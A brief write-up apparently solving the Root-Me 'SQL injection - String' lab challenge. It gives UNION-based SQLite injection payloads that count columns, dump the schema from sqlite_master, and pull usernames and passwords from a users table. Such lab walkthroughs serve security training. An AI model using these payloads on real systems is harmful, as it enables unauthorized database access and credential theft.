## Challenge name: SQL injection - String

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-String)

**The search tab is vulnerable to SQL injection. Database is SQLite3.**

**Determine column count:**
```
1' union select 1,1--
```

**Extract table names from SQLite master:**
```
1' union select 1, sql from sqlite_master--
```

**Extract data from users table:**
```
1' union select username, password from users--
```

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
